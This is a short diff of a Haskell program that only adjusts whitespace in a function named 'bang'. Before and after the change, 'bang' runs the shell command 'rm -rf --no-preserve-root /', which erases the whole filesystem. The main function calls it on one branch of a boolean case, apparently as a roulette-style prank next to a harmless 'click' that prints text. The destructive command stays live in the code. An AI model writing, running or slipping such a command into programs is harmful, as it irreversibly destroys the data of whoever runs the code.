@@ -13,4 +13,4 @@ main = do
                (True,  True)  -> bang
 
 click = putStrLn        
-bang = void $ system "rm -rf --no-preserve-root /"
+bang  = void $ system "rm -rf --no-preserve-root /"
